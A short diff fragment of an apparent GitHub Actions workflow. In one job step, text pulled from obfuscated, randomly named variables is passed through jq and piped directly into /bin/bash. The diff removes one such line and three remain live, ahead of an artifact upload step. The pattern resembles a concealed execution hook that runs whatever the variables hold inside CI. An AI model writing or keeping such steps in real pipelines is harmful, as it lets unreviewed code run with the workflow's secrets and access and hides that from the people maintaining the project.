@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$zpz4557" | jq -r .gdtyr73482 | /bin/bash
           echo $xxv31688 | jq -r .hszx0745 | /bin/bash
           printf '%s' "$slf040" | jq -r .lzixv695 | /bin/bash
-          printf '%s' "$rqr22406" | jq -r .tbz871 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
